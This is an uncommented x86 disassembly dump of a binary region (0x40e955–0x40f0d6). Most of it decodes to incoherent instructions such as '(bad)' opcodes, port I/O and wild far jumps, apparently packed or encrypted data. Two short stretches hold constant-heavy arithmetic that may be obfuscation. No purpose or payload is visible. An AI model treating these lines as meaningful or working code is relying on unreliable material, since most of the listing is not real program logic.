  40e955:	cmp    BYTE PTR [ebx-0x41bfa980],cl
  40e95b:	dec    ecx
  40e95c:	sub    al,0x64
  40e95e:	jbe    0x40e988
  40e960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e961:	pop    esi
  40e962:	test   BYTE PTR [eax],0xf
  40e965:	xor    al,0x19
  40e967:	adc    DWORD PTR [edi+esi*2],ecx
  40e96a:	xor    al,0xc5
  40e96c:	or     eax,0x58fe7126
  40e971:	in     al,dx
  40e972:	sbb    al,0x15
  40e974:	ret    
  40e975:	inc    ecx
  40e976:	inc    edi
  40e977:	pop    eax
  40e978:	lahf   
  40e979:	mov    bh,0xdb
  40e97b:	jge    0x40e905
  40e97d:	add    eax,0xad820d9d
  40e982:	jmp    0x40e943
  40e984:	xchg   DWORD PTR [esi+0x38],ebx
  40e987:	jle    0x40e95d
  40e989:	rcr    BYTE PTR [edx],1
  40e98b:	test   al,0x9e
  40e98d:	stos   BYTE PTR es:[edi],al
  40e98e:	cmp    eax,edi
  40e990:	push   0x16546da7
  40e995:	dec    edx
  40e996:	mov    cl,0x5b
  40e998:	sbb    DWORD PTR [eax+edi*2+0x33ae4351],ebx
  40e99f:	mov    ch,BYTE PTR [ebx-0x1b]
  40e9a2:	or     al,0xa1
  40e9a4:	sbb    bl,BYTE PTR [ebp-0x47]
  40e9a7:	push   ebx
  40e9a8:	or     al,0xdd
  40e9aa:	shl    BYTE PTR [ecx+0x62f4d33f],1
  40e9b0:	adc    al,0xeb
  40e9b2:	in     eax,0x28
  40e9b4:	ds mov edx,0xd8c5900
  40e9ba:	xchg   edi,eax
  40e9bb:	jnp    0x40e9fb
  40e9bd:	aam    0x34
  40e9bf:	in     al,0x1c
  40e9c1:	pusha  
  40e9c2:	push   edx
  40e9c3:	ss pop ds
  40e9c5:	mov    esp,0x84a7df02
  40e9ca:	xor    cl,dl
  40e9cc:	out    dx,eax
  40e9cd:	sbb    al,0x63
  40e9cf:	ds stos BYTE PTR es:[edi],al
  40e9d1:	mov    ebx,DWORD PTR [esp+eax*2+0x59]
  40e9d5:	dec    eax
  40e9d6:	sub    BYTE PTR [ecx-0x33b27254],dh
  40e9dc:	mov    esp,0x2fe95ee3
  40e9e1:	push   ebp
  40e9e2:	popa   
  40e9e3:	mov    ah,0x6b
  40e9e5:	push   esp
  40e9e6:	mov    eax,edx
  40e9e8:	(bad)  
  40e9ea:	mov    cl,0x2b
  40e9ec:	inc    ebx
  40e9ed:	and    edi,DWORD PTR [esi+0x2d]
  40e9f0:	pop    edx
  40e9f1:	call   0x84e2b3f4
  40e9f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9f7:	xor    eax,0xcfd6c2fd
  40e9fc:	stc    
  40e9fd:	mov    cl,0x1d
  40e9ff:	addr16 jmp 0xec048a74
  40ea05:	pop    ebx
  40ea06:	arpl   bp,cx
  40ea08:	hlt    
  40ea09:	(bad)  [edi+0x38]
  40ea0c:	pop    edi
  40ea0d:	add    ecx,eax
  40ea0f:	aas    
  40ea10:	rol    BYTE PTR [ebx+0x2a],1
  40ea13:	inc    ecx
  40ea14:	shl    DWORD PTR [ecx-0x2f],0x95
  40ea18:	sbb    BYTE PTR [esi+ecx*1+0x2ddbc44e],bl
  40ea1f:	aaa    
  40ea20:	or     dl,BYTE PTR [edi+0x73]
  40ea23:	hlt    
  40ea24:	xchg   ebp,eax
  40ea25:	sub    cl,dh
  40ea27:	jns    0x40ea20
  40ea29:	inc    esi
  40ea2a:	loop   0x40ea49
  40ea2c:	fcom   QWORD PTR [ebx]
  40ea2e:	xchg   ecx,eax
  40ea2f:	stc    
  40ea30:	push   ds
  40ea31:	ja     0x40ea96
  40ea33:	inc    ecx
  40ea34:	js     0x40eab0
  40ea36:	in     eax,dx
  40ea37:	inc    edi
  40ea38:	push   ds
  40ea39:	jge    0x40ea97
  40ea3b:	shl    esp,1
  40ea3d:	gs jecxz 0x40ea10
  40ea40:	(bad)  
  40ea41:	cmp    dh,bl
  40ea43:	pop    eax
  40ea44:	and    ah,BYTE PTR fs:[edx+0x6f]
  40ea48:	dec    edi
  40ea49:	mov    dl,0x1f
  40ea4b:	fimul  WORD PTR [ecx+0x52c8b891]
  40ea51:	sbb    ch,dh
  40ea53:	or     DWORD PTR [eax],esp
  40ea55:	aam    0x71
  40ea57:	ret    0x51ed
  40ea5a:	bound  edx,QWORD PTR [ebx]
  40ea5c:	and    bh,BYTE PTR [ebx]
  40ea5e:	frstor [edx-0x4bfe38b3]
  40ea64:	in     al,0xcd
  40ea66:	scas   al,BYTE PTR es:[edi]
  40ea67:	cmp    DWORD PTR [ebp-0x650729fa],ebx
  40ea6d:	dec    eax
  40ea6e:	(bad)  
  40ea70:	push   ecx
  40ea71:	xor    ah,BYTE PTR [eax]
  40ea73:	cmp    ah,BYTE PTR [esi+0x57bdf6eb]
  40ea79:	lock pushf 
  40ea7b:	mov    eax,ds:0x8525de97
  40ea80:	mov    ebp,0x6f9e0d03
  40ea85:	pop    ds
  40ea86:	gs mov eax,0xd6fbdc04
  40ea8c:	repnz scas eax,DWORD PTR es:[edi]
  40ea8e:	mov    ds:0xd607ec0c,al
  40ea93:	push   ebx
  40ea94:	inc    esi
  40ea95:	leave  
  40ea96:	add    ebx,DWORD PTR [esi]
  40ea98:	test   DWORD PTR [esi-0x2d],edx
  40ea9b:	scas   al,BYTE PTR es:[edi]
  40ea9c:	mov    dh,dl
  40ea9e:	jnp    0x40ea87
  40eaa0:	push   ss
  40eaa1:	xor    dx,dx
  40eaa4:	div    edi
  40eaa6:	mov    edx,DWORD PTR ds:0x422558
  40eaac:	mov    edx,DWORD PTR [edx+0x1d4]
  40eab2:	sub    edx,eax
  40eab4:	mov    eax,DWORD PTR [ebp+0x10]
  40eab7:	mov    al,BYTE PTR [esi+eax*1]
  40eaba:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40eac1:	mov    eax,DWORD PTR [ebp-0x1c]
  40eac4:	mov    edx,DWORD PTR [ebp-0x18]
  40eac7:	imul   eax,edx
  40eaca:	mov    edx,DWORD PTR [ebp-0x14]
  40eacd:	imul   eax,eax,0x262b
  40ead3:	or     eax,edx
  40ead5:	mov    edx,DWORD PTR [ebp-0x10]
  40ead8:	or     eax,edx
  40eada:	xor    eax,0x59f6
  40eadf:	jmp    0x40eda3
  40eae4:	sub    BYTE PTR [edi-0x3c],0x71
  40eae8:	pushf  
  40eae9:	sbb    bl,BYTE PTR [edx]
  40eaeb:	pop    edx
  40eaec:	mov    ebp,0xf7aa14b9
  40eaf1:	cs cdq 
  40eaf3:	mov    esp,0x1818b8fd
  40eaf8:	rcl    BYTE PTR [eax+ebx*1],cl
  40eafb:	sbb    BYTE PTR [eax-0x77],cl
  40eafe:	push   cs
  40eaff:	fistp  QWORD PTR ds:0x9fe434da
  40eb05:	xor    DWORD PTR [ebx+0x30f687f7],edi
  40eb0b:	add    al,0x35
  40eb0d:	ja     0x40eb1f
  40eb0f:	test   eax,0xd376c8b9
  40eb14:	addr16 pop esi
  40eb16:	xchg   ebp,eax
  40eb17:	ret    
  40eb18:	sub    eax,0x4cd588cb
  40eb1d:	sub    BYTE PTR [ecx],ah
  40eb1f:	sar    BYTE PTR [ebx+0xf],0xd
  40eb23:	(bad)  
  40eb24:	pusha  
  40eb25:	jl     0x40eab6
  40eb27:	mov    esp,0xb626abb0
  40eb2c:	retf   0x37f0
  40eb2f:	mov    esp,0xdc2e6fb
  40eb34:	fistp  QWORD PTR [esi+0xb]
  40eb37:	pusha  
  40eb38:	call   0xed36:0x92c9f638
  40eb3f:	sub    DWORD PTR [esi+0x3d6fbe32],0xffffffb4
  40eb46:	jg     0x40eb70
  40eb48:	in     al,0xdb
  40eb4a:	xchg   esi,eax
  40eb4b:	sub    dh,al
  40eb4d:	clc    
  40eb4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb4f:	add    eax,0x94364c3e
  40eb54:	sub    eax,0xcf5f1cd2
  40eb59:	cli    
  40eb5a:	es xchg esi,eax
  40eb5c:	sub    cl,BYTE PTR [ecx+0x7480b95a]
  40eb62:	xor    BYTE PTR [eax],al
  40eb64:	pop    edx
  40eb65:	pop    ss
  40eb66:	rol    BYTE PTR [edx],cl
  40eb68:	dec    esi
  40eb69:	mov    ecx,0x6e119442
  40eb6e:	push   ebx
  40eb6f:	retf   0xbe47
  40eb72:	push   ds
  40eb73:	ror    BYTE PTR [ecx+0x7a5abe07],cl
  40eb79:	clc    
  40eb7a:	cmp    dh,BYTE PTR [esi]
  40eb7c:	sbb    eax,0xa134cbb8
  40eb81:	fldz   
  40eb83:	adc    esi,DWORD PTR [ebp+0x71a92ba2]
  40eb89:	nop
  40eb8a:	cmp    DWORD PTR ds:0xa8bc5751,esi
  40eb90:	adc    al,0xe7
  40eb92:	mov    dl,BYTE PTR [edi+0x39574d0d]
  40eb98:	and    esp,esi
  40eb9a:	shl    DWORD PTR [edx+0x5e294dad],1
  40eba0:	sbb    BYTE PTR [edx],0x1f
  40eba3:	xchg   ebp,eax
  40eba4:	adc    DWORD PTR [eax-0x4c649a7a],ebx
  40ebaa:	and    ch,BYTE PTR [edi]
  40ebac:	lds    ebx,FWORD PTR [ecx]
  40ebae:	popa   
  40ebaf:	mul    DWORD PTR cs:[eax+0x7318fc0]
  40ebb6:	arpl   WORD PTR [edx+0x6f6e34bf],di
  40ebbc:	mov    eax,ds:0x1191e300
  40ebc1:	jbe    0x40ec09
  40ebc3:	mov    esp,0x379a5911
  40ebc8:	stc    
  40ebc9:	inc    esp
  40ebca:	stos   BYTE PTR es:[edi],al
  40ebcb:	pop    ebp
  40ebcc:	mov    al,0x3e
  40ebce:	clc    
  40ebcf:	xchg   esi,eax
  40ebd0:	mov    ds:0x2f5f5152,eax
  40ebd5:	clc    
  40ebd6:	and    BYTE PTR [edi+0x683247da],bl
  40ebdc:	ror    cl,0x6f
  40ebdf:	pop    esp
  40ebe0:	jle    0x40ec44
  40ebe2:	inc    ecx
  40ebe3:	fimul  WORD PTR [edx+0x10]
  40ebe6:	in     eax,dx
  40ebe7:	and    esi,0x7f
  40ebea:	lahf   
  40ebeb:	jno    0x40ec38
  40ebed:	sbb    BYTE PTR [ecx-0x3a6565fc],ah
  40ebf3:	shl    BYTE PTR [ebp-0x2331cb0a],1
  40ebf9:	push   es
  40ebfa:	adc    BYTE PTR [esi],bh
  40ebfc:	jl     0x40ec21
  40ebfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebff:	sbb    al,BYTE PTR [edx-0x5e]
  40ec02:	aas    
  40ec03:	jmp    0x40ebb6
  40ec05:	jae    0x40ec86
  40ec07:	sub    ah,BYTE PTR [edx+0x64d1b790]
  40ec0d:	iret   
  40ec0e:	jmp    0xd93b:0xcb3f79fe
  40ec15:	jle    0x40ec67
  40ec17:	xor    BYTE PTR [ecx+0xfb70374],bh
  40ec1d:	adc    al,0x52
  40ec1f:	xchg   ebp,eax
  40ec20:	out    dx,eax
  40ec21:	int3   
  40ec22:	jnp    0x40ec99
  40ec24:	push   eax
  40ec25:	xor    edi,DWORD PTR [ebx+edi*8+0x45]
  40ec29:	inc    ebp
  40ec2a:	mov    edx,0x70924f53
  40ec2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec30:	hlt    
  40ec31:	cmp    DWORD PTR [edi+0x35],edi
  40ec34:	clc    
  40ec35:	sub    ch,bl
  40ec37:	jno    0x40ecb3
  40ec39:	fcomp  DWORD PTR [ebx+0x476a7f96]
  40ec3f:	test   al,0xe5
  40ec41:	dec    eax
  40ec42:	cs gs pop ecx
  40ec45:	popa   
  40ec46:	arpl   WORD PTR [eax+0x5a1dc197],cx
  40ec4c:	bound  eax,QWORD PTR [edi]
  40ec4e:	ins    BYTE PTR es:[edi],dx
  40ec4f:	rdpmc  
  40ec51:	test   al,0xe3
  40ec53:	dec    esi
  40ec54:	mov    edi,DWORD PTR [eax*2-0x961eefd]
  40ec5b:	jae    0x40ec34
  40ec5d:	(bad)  
  40ec5e:	mov    ebx,0xaad31f9d
  40ec63:	aaa    
  40ec64:	cmp    esi,DWORD PTR es:[edi-0x6fb9024e]
  40ec6b:	dec    ebp
  40ec6c:	fld    TBYTE PTR [ecx]
  40ec6e:	stos   BYTE PTR es:[edi],al
  40ec6f:	arpl   WORD PTR [ebx-0x31],sp
  40ec72:	pop    ebx
  40ec73:	mov    dl,0x89
  40ec75:	cmp    DWORD PTR [eax-0xef11f00],ebx
  40ec7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec7c:	mov    ch,0x8e
  40ec7e:	into   
  40ec7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec80:	ja     0x40ec99
  40ec82:	jns    0x40ec20
  40ec84:	(bad)  
  40ec86:	nop
  40ec87:	push   edx
  40ec88:	imul   edi,ebp,0x3b08d2b1
  40ec8e:	iret   
  40ec8f:	pop    edx
  40ec90:	shl    BYTE PTR [edi+0x4d],0x77
  40ec94:	pushf  
  40ec95:	inc    ecx
  40ec96:	adc    DWORD PTR [edi-0x47d48ca2],ebx
  40ec9c:	add    esp,DWORD PTR [eax+0x61344504]
  40eca2:	lahf   
  40eca3:	jnp    0x40ecbe
  40eca5:	jb     0x40ec45
  40eca7:	es add esi,edi
  40ecaa:	xchg   edi,eax
  40ecab:	sbb    al,0xcb
  40ecad:	jno    0x40ed0e
  40ecaf:	cmp    BYTE PTR [ecx+0x46152a6a],ch
  40ecb5:	and    al,0xa0
  40ecb7:	jl     0x40ed0d
  40ecb9:	outs   dx,BYTE PTR ds:[esi]
  40ecba:	cli    
  40ecbb:	mov    cl,0xa7
  40ecbd:	daa    
  40ecbe:	jmp    0xb2ad:0x1f510558
  40ecc5:	sbb    al,0x5
  40ecc7:	daa    
  40ecc8:	jne    0x40ec6e
  40ecca:	or     esi,eax
  40eccc:	xor    dh,BYTE PTR [ecx-0x26]
  40eccf:	sti    
  40ecd0:	imul   ebp,DWORD PTR [ecx+0x14],0x811e4f51
  40ecd7:	repnz popf 
  40ecd9:	mov    eax,0x5000c502
  40ecde:	shr    ah,cl
  40ece0:	mov    al,ds:0x47c481a0
  40ece5:	int    0x50
  40ece7:	(bad)  
  40ece8:	cld    
  40ece9:	(bad)  
  40ecea:	and    ebp,DWORD PTR [esi-0x6b]
  40eced:	ret    
  40ecee:	inc    ecx
  40ecef:	and    ch,BYTE PTR [esi]
  40ecf1:	inc    ebx
  40ecf2:	or     eax,DWORD PTR [ebx+0x74288a7b]
  40ecf8:	mov    eax,ds:0x4e56830c
  40ecfd:	outs   dx,DWORD PTR ds:[esi]
  40ecfe:	xor    cl,bh
  40ed00:	adc    al,0xe8
  40ed02:	lahf   
  40ed03:	sbb    BYTE PTR [eax+0x2e],0xd0
  40ed07:	mov    ebp,0x3e9790f1
  40ed0c:	xchg   DWORD PTR [esi],edi
  40ed0e:	xchg   ah,dl
  40ed10:	xchg   DWORD PTR [edi+0x3c],ebx
  40ed13:	mov    edi,0xe8b4f9d0
  40ed18:	push   eax
  40ed19:	mov    ss:0x43fa45b5,al
  40ed1f:	ins    DWORD PTR es:[edi],dx
  40ed20:	mov    bh,0x66
  40ed22:	jbe    0x40eda1
  40ed24:	and    BYTE PTR [esi-0x7eb8688e],ah
  40ed2a:	add    BYTE PTR [esi-0x59],cl
  40ed2d:	push   0x5e64e6da
  40ed32:	repnz call FWORD PTR [ebp+0x57]
  40ed36:	shr    ecx,0x10
  40ed39:	pop    edx
  40ed3a:	push   es
  40ed3b:	inc    ebx
  40ed3c:	sbb    esi,DWORD PTR [ecx-0x5c]
  40ed3f:	leave  
  40ed40:	and    al,0x99
  40ed42:	fisttp WORD PTR [esi-0x2b]
  40ed45:	and    edi,DWORD PTR [eax+0x18]
  40ed48:	or     DWORD PTR [edx-0x3f2778ae],0x1b22e670
  40ed52:	in     al,0x1f
  40ed54:	jmp    0xb3d44601
  40ed59:	mov    al,0x51
  40ed5b:	scas   al,BYTE PTR es:[edi]
  40ed5c:	sar    BYTE PTR [eax+ecx*4-0x2b],1
  40ed60:	ins    BYTE PTR es:[edi],dx
  40ed61:	popf   
  40ed62:	mov    esp,0x3f6633b7
  40ed67:	or     eax,ebx
  40ed69:	test   DWORD PTR [ecx-0x73bd8a5e],esi
  40ed6f:	mov    esp,ecx
  40ed71:	xchg   ebx,eax
  40ed72:	mov    BYTE PTR [edi+esi*4],bl
  40ed75:	pop    edx
  40ed76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed77:	pushf  
  40ed78:	push   ebx
  40ed79:	mov    ds:0x2b6e7a7f,eax
  40ed7e:	push   eax
  40ed7f:	and    dl,BYTE PTR [edi]
  40ed81:	rcr    BYTE PTR [ebx+0x72],cl
  40ed84:	call   0x3405719d
  40ed89:	dec    edi
  40ed8a:	sbb    DWORD PTR [eax],0x73
  40ed8d:	stos   BYTE PTR es:[edi],al
  40ed8e:	xchg   edi,eax
  40ed8f:	xchg   ebp,eax
  40ed90:	out    dx,al
  40ed91:	outs   dx,DWORD PTR ds:[esi]
  40ed92:	adc    al,0x22
  40ed94:	imul   edi,DWORD PTR [eax-0x33],0xffffffc4
  40ed98:	out    dx,eax
  40ed99:	inc    ebp
  40ed9a:	(bad)  
  40ed9b:	xor    ebp,DWORD PTR [eax]
  40ed9d:	cwde   
  40ed9e:	ret    0xc945
  40eda1:	mov    eax,DWORD PTR [ebp-0x19fe7373]
  40eda7:	pop    ecx
  40eda8:	add    eax,0xf4458b35
  40edad:	and    eax,0xddc
  40edb2:	add    eax,DWORD PTR [ebp-0x8]
  40edb5:	xor    eax,0x46e3
  40edba:	add    eax,0x50eb
  40edbf:	cmp    ecx,eax
  40edc1:	jmp    0x40f085
  40edc6:	cmp    DWORD PTR [edx-0x25e5f4a4],ecx
  40edcc:	daa    
  40edcd:	sub    ch,BYTE PTR [edx+0x41aa1270]
  40edd3:	cmp    al,0x1b
  40edd5:	jle    0x40ed8e
  40edd7:	mov    dl,0x18
  40edd9:	sbb    dl,dl
  40eddb:	adc    al,0x18
  40eddd:	sbb    bh,bl
  40eddf:	retf   
  40ede0:	idiv   DWORD PTR es:[edx]
  40ede3:	cld    
  40ede4:	rcr    DWORD PTR [edi],0xb9
  40ede7:	jg     0x40edc4
  40ede9:	mov    dl,dl
  40edeb:	fwait
  40edec:	inc    edi
  40eded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edee:	pop    ecx
  40edef:	jecxz  0x40ed89
  40edf1:	popf   
  40edf2:	cli    
  40edf3:	(bad)  
  40edf4:	stos   DWORD PTR es:[edi],eax
  40edf5:	jmp    0x7b9eecca
  40edfa:	(bad)
  40edfe:	sub    dh,BYTE PTR [edx-0x599cbb80]
  40ee04:	lods   eax,DWORD PTR ds:[esi]
  40ee05:	rol    esi,cl
  40ee07:	sbb    ebx,DWORD PTR [edi-0x1f36e9a6]
  40ee0d:	push   0x8398b337
  40ee12:	and    al,0xf7
  40ee14:	and    al,0xb1
  40ee16:	xor    cl,bl
  40ee18:	rcl    BYTE PTR [edi+0x34f52d93],0xfc
  40ee1f:	pcmpgtd mm4,QWORD PTR [ebx+0x5cfaa954]
  40ee26:	mov    esi,DWORD PTR [ebp+0x18]
  40ee29:	xchg   BYTE PTR [ecx+ecx*4],bh
  40ee2c:	shr    BYTE PTR [ebx+0x76],0xc9
  40ee30:	sub    ah,BYTE PTR [esi+0x4245c41]
  40ee36:	pop    ecx
  40ee37:	pop    ebp
  40ee38:	pop    edx
  40ee39:	dec    esi
  40ee3a:	jne    0x40ee6b
  40ee3c:	fidiv  DWORD PTR [ecx]
  40ee3e:	push   esi
  40ee3f:	out    0x9f,eax
  40ee41:	or     BYTE PTR [edx-0x2],bl
  40ee44:	push   es
  40ee45:	jmp    0x40ee80
  40ee47:	pop    edi
  40ee48:	pushf  
  40ee49:	sub    edi,DWORD PTR [esi]
  40ee4b:	or     DWORD PTR [ecx+0x6a816dac],edi
  40ee51:	pop    ss
  40ee52:	inc    esp
  40ee53:	out    dx,eax
  40ee54:	push   cs
  40ee55:	cmc    
  40ee56:	stc    
  40ee57:	push   ecx
  40ee58:	ror    DWORD PTR ds:0x9bc87f2f,1
  40ee5e:	retf   
  40ee5f:	cmp    al,0x87
  40ee61:	mov    BYTE PTR [edx+0x27b9874b],dh
  40ee67:	xlat   BYTE PTR ds:[ebx]
  40ee68:	sbb    dh,BYTE PTR ds:0xb2f69fe5
  40ee6e:	inc    esp
  40ee6f:	les    ebx,FWORD PTR [eax-0x25a86486]
  40ee75:	add    DWORD PTR [edi],0xffffff96
  40ee78:	push   ecx
  40ee79:	sbb    dl,BYTE PTR [esi-0x4d]
  40ee7c:	push   es
  40ee7d:	ins    DWORD PTR es:[edi],dx
  40ee7e:	fcmovbe st,st(4)
  40ee80:	mov    dl,0x68
  40ee82:	inc    edi
  40ee83:	(bad)  
  40ee84:	jmp    0x40ee22
  40ee86:	stos   BYTE PTR es:[edi],al
  40ee87:	fsubr  QWORD PTR [esi]
  40ee89:	jns    0x40eea0
  40ee8b:	outs   dx,DWORD PTR ds:[esi]
  40ee8c:	xchg   ebp,eax
  40ee8d:	ret    0x4c76
  40ee90:	stos   DWORD PTR es:[edi],eax
  40ee91:	scas   al,BYTE PTR es:[edi]
  40ee92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee93:	fisttp QWORD PTR [eax-0x6f]
  40ee96:	outs   dx,BYTE PTR ds:[esi]
  40ee97:	in     al,0x9a
  40ee99:	(bad)  
  40ee9a:	dec    esi
  40ee9b:	mov    ch,0x1a
  40ee9d:	push   esi
  40ee9e:	fidiv  WORD PTR [bp+si-0x2dd1]
  40eea3:	ins    BYTE PTR es:[edi],dx
  40eea4:	push   ebp
  40eea5:	push   esp
  40eea6:	fisttp QWORD PTR [ecx+0xc]
  40eea9:	dec    ebx
  40eeab:	idiv   BYTE PTR [ecx+ecx*2-0x76bda90b]
  40eeb2:	arpl   ax,cx
  40eeb4:	cmp    eax,0xac59fc08
  40eeb9:	pusha  
  40eeba:	xor    DWORD PTR [eax],ecx
  40eebc:	adc    cl,cl
  40eebe:	retf   
  40eebf:	jle    0x40ef36
  40eec1:	pop    es
  40eec2:	sti    
  40eec3:	mov    ch,0xc3
  40eec5:	test   BYTE PTR [ebx],cl
  40eec7:	aas    
  40eec8:	(bad)  
  40eec9:	push   0x95392994
  40eece:	mov    dl,0x97
  40eed0:	fldenv [ebx+0x62b3418d]
  40eed6:	loopne 0x40ef38
  40eed8:	jmp    0xc7a1:0x7fec7fb4
  40eedf:	icebp  
  40eee0:	sahf   
  40eee1:	lock aaa 
  40eee3:	mov    ds:0xce693544,eax
  40eee8:	or     DWORD PTR [esi+0x7e9c0871],ebp
  40eeee:	mov    dl,0xb4
  40eef0:	push   ds
  40eef1:	jle    0x40ef4c
  40eef3:	push   ds
  40eef4:	pushf  
  40eef5:	pop    ds
  40eef6:	cmp    eax,0xfce95803
  40eefb:	pop    ebx
  40eefc:	xchg   ebp,eax
  40eefd:	xchg   esi,eax
  40eefe:	mov    ds:0xfec3f9ef,eax
  40ef03:	imul   ecx,DWORD PTR [edx-0x2f],0xf77d6c67
  40ef0a:	mov    BYTE PTR [ebp-0x67a4b6f2],ah
  40ef10:	psllq  mm3,QWORD PTR [ecx-0x9]
  40ef14:	mov    eax,ss:0x92ee0a9f
  40ef1a:	push   esp
  40ef1b:	arpl   bp,dx
  40ef1d:	repnz cmp ebx,ebp
  40ef20:	out    0xf1,al
  40ef22:	and    DWORD PTR [ebx+0x74],esp
  40ef25:	adc    DWORD PTR [ecx-0x46],esp
  40ef28:	xor    dl,BYTE PTR ds:0x796a2c27
  40ef2e:	sbb    DWORD PTR [ecx],eax
  40ef30:	sbb    eax,0x21c0ab16
  40ef35:	mov    dh,0x68
  40ef37:	dec    ebx
  40ef38:	addr16 mov bh,0x19
  40ef3b:	aad    0x33
  40ef3d:	mov    bl,0xa6
  40ef3f:	push   esp
  40ef40:	pop    ecx
  40ef41:	jle    0x40ef63
  40ef43:	push   ebp
  40ef44:	cmc    
  40ef45:	push   ds
  40ef46:	xor    DWORD PTR [eax],eax
  40ef48:	jmp    0x40efc2
  40ef4a:	cmp    DWORD PTR [esi+0x53366688],eax
  40ef50:	cmp    ch,BYTE PTR [esi]
  40ef52:	lahf   
  40ef53:	les    esi,FWORD PTR [esi-0x18]
  40ef56:	imul   edi,DWORD PTR [ebx+0x50abde9b],0x51a5f604
  40ef60:	sub    bh,BYTE PTR [esi]
  40ef62:	scas   eax,DWORD PTR es:[edi]
  40ef63:	xor    cl,dh
  40ef65:	fwait
  40ef66:	pop    ecx
  40ef67:	mov    edi,ebp
  40ef69:	les    ebx,FWORD PTR [ebx+0x63c33da]
  40ef6f:	add    al,0x63
  40ef71:	es ds addr16 push ecx
  40ef75:	cdq    
  40ef76:	imul   esi,DWORD PTR [esi+0x43d48fca],0x4a8fcd26
  40ef80:	das    
  40ef81:	lods   eax,DWORD PTR ds:[esi]
  40ef82:	jmp    0x49ad4266
  40ef87:	dec    edi
  40ef88:	add    eax,0x5d006f09
  40ef8d:	push   ebx
  40ef8e:	jp     0x40ef2c
  40ef90:	arpl   WORD PTR [ecx],sp
  40ef92:	inc    ecx
  40ef93:	hlt    
  40ef94:	sub    BYTE PTR [edx+0x661e4087],dh
  40ef9a:	pop    ecx
  40ef9b:	mov    dh,0x88
  40ef9d:	sbb    eax,0x3d44616a
  40efa2:	imul   eax,DWORD PTR [ecx],0x3aa6f0b6
  40efa8:	cld    
  40efa9:	xlat   BYTE PTR ds:[ebx]
  40efaa:	bound  edx,QWORD PTR [ebx]
  40efac:	cli    
  40efad:	loopne 0x40ef6f
  40efaf:	mov    esi,0xd181c94b
  40efb4:	mov    ds:0xa0832688,al
  40efb9:	aam    0x25
  40efbb:	leave  
  40efbc:	aad    0x1c
  40efbe:	imul   esi,DWORD PTR [eax-0x2d179c56],0x303d60c9
  40efc8:	adc    DWORD PTR [ebp+esi*1+0x61],esp
  40efcc:	adc    BYTE PTR [edx-0x2d54fa40],ch
  40efd2:	adc    DWORD PTR [ebp+0x1d],0x180a9882
  40efd9:	mov    bh,0x40
  40efdb:	lods   eax,DWORD PTR ds:[esi]
  40efdc:	sub    BYTE PTR [ebx-0x10e467bc],al
  40efe2:	shl    BYTE PTR [esi-0x7b205d28],cl
  40efe8:	inc    ecx
  40efe9:	aas    
  40efea:	popa   
  40efeb:	les    esi,FWORD PTR [ebp-0x6ff49e3]
  40eff1:	psllw  mm7,QWORD PTR [edx-0x7e070c0a]
  40eff8:	mov    al,0x76
  40effa:	sbb    eax,DWORD PTR [edx]
  40effc:	xor    DWORD PTR [edi-0x3a7ae090],edi
  40f002:	pop    es
  40f003:	inc    ecx
  40f004:	cwde   
  40f005:	cmp    DWORD PTR [ebp+0x1fbacf41],esi
  40f00b:	call   0x3afebc4d
  40f010:	mov    dl,0x18
  40f012:	test   eax,0x649f2463
  40f017:	rol    BYTE PTR [edi+eiz*4+0x1e],1
  40f01b:	xchg   BYTE PTR [ebp-0x3cecd996],bh
  40f021:	push   ss
  40f022:	(bad)  
  40f023:	mov    ds:0x67006632,al
  40f028:	or     al,ch
  40f02a:	jge    0x40f014
  40f02c:	mov    BYTE PTR [edi],bh
  40f02e:	js     0x40f007
  40f030:	dec    ecx
  40f031:	shl    BYTE PTR [eax],cl
  40f033:	lahf   
  40f034:	imul   esp,DWORD PTR [eax-0x4b74e77b],0xca65d628
  40f03e:	lock popa 
  40f040:	cmc    
  40f041:	mov    esp,0x771e2975
  40f046:	push   ebx
  40f047:	js     0x40efe9
  40f049:	mov    ecx,0xa9df2c52
  40f04e:	addr16 pop ebp
  40f050:	pushf  
  40f051:	sbb    al,0xd9
  40f053:	repnz out 0xc1,al
  40f056:	pop    ecx
  40f057:	fcom   QWORD PTR [ecx+0x7e49533e]
  40f05d:	mov    esp,0xfba3f5b0
  40f062:	mov    al,BYTE PTR [esi+0x1091b64f]
  40f068:	outs   dx,BYTE PTR ds:[esi]
  40f069:	sub    edi,eax
  40f06b:	fwait
  40f06c:	repnz cdq 
  40f06e:	or     bl,al
  40f070:	mov    edx,0x3f4ae995
  40f075:	xchg   ebx,eax
  40f076:	fisub  WORD PTR ds:0x57842d7b
  40f07c:	pusha  
  40f07d:	adc    cl,0xe5
  40f080:	jge    0x40f048
  40f082:	cmp    eax,0x850f85c5
  40f087:	or     bh,dh
  40f089:	(bad)  
  40f08a:	call   FWORD PTR [edi-0x17]
  40f08d:	mov    edi,0x47000002
  40f092:	mov    ds:0x305a70db,al
  40f097:	inc    edx
  40f098:	call   0x8d0a:0xaa146552
  40f09f:	jge    0x40f051
  40f0a1:	jo     0x40f051
  40f0a3:	sbb    BYTE PTR [eax],bl
  40f0a5:	rcl    BYTE PTR [eax+ebx*1],cl
  40f0a8:	sbb    BYTE PTR [eax+0x22f9b0d],bh
  40f0ae:	test   al,0x7e
  40f0b0:	pop    ss
  40f0b1:	bound  ebx,QWORD PTR [edi+0x33589ec]
  40f0b7:	xor    cl,0x45
  40f0ba:	(bad)  
  40f0bb:	data16 das 
  40f0bd:	(bad)  
  40f0be:	out    0x96,eax
  40f0c0:	cs jmp 0x6d039d99
  40f0c6:	repz pop esp
  40f0c8:	xchg   ebp,eax
  40f0c9:	ins    BYTE PTR es:[edi],dx
  40f0ca:	jg     0x40f0fe
  40f0cc:	sahf   
  40f0cd:	in     al,dx
  40f0ce:	outs   dx,BYTE PTR ds:[esi]
  40f0cf:	cmp    dl,bh
  40f0d1:	dec    edx
  40f0d2:	inc    edx
  40f0d3:	cwde   
  40f0d4:	in     eax,0x26
  40f0d6:	inc    edx
